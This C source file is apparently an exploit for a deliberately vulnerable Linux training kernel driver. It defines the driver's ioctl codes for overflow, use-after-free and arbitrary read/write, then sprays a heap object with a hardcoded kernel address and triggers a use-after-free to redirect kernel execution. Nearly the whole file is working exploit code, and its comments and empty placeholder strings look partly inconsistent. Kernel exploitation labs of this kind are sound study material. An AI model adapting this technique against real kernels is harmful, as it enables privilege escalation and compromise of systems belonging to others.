#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>

//#include "common.h"
//#include "vuln_driver.h"
#ifndef _VULN_DRIVER_
	#define _VULN_DRIVER_
	#define DEVICE_NAME "vulnerable_device"
	#define IOCTL_NUM 0xFE
	#define DRIVER_TEST _IO (IOCTL_NUM, 0) 
	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM, 1, char *)
	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM, 2, unsigned long)
	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM, 3)
	#define USE_UAF_OBJ _IO (IOCTL_NUM, 4)
	#define ALLOC_K_OBJ _IOR (IOCTL_NUM, 5, unsigned long)
	#define FREE_UAF_OBJ _IO(IOCTL_NUM, 6)
	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM, 7, unsigned long)
	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM, 8, unsigned long)
	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM, 9, unsigned long)
	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM, 10, unsigned long)
	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM, 11, unsigned long)
	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM, 12, unsigned long)
	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM, 13, unsigned long)
#endif

#define BUFF_SIZE 96

typedef struct k_object
{
	char buff[BUFF_SIZE];
}k_object;

void use_after_free_kobj(int fd)
{
     k_object *obj = malloc(sizeof(k_object));
    char*a="";
	char*b="";
	//60 bytes overwrites the last 4 bytes of the address
    memset(obj->buff, 0x42, 64); //ffffffffc05b2080
	memcpy((obj->buff+56),a,8);
	memset((obj->buff+64), 0x80, 1);
	memset((obj->buff+65), 0x20, 1);
	memset((obj->buff+66), 0x5b, 1);
	memset((obj->buff+67), 0xc0, 1);
	memset((obj->buff+68), 0xff, 1);
	memset((obj->buff+69), 0xff, 1);
	memset((obj->buff+70), 0xff, 1);
	memset((obj->buff+71), 0xff, 1);
    ioctl(fd, ALLOC_UAF_OBJ, NULL);
    ioctl(fd, FREE_UAF_OBJ, NULL);

    ioctl(fd, ALLOC_K_OBJ, obj);
    ioctl(fd, USE_UAF_OBJ, NULL);
    return ;
}

int main(void)
{
	int fd = open("/dev/vulnerable_device", O_RDWR);
	if (fd<0){
		printf("[-] Open error!\n");
		return 0;
	}
	use_after_free_kobj(fd);
	return 0;
}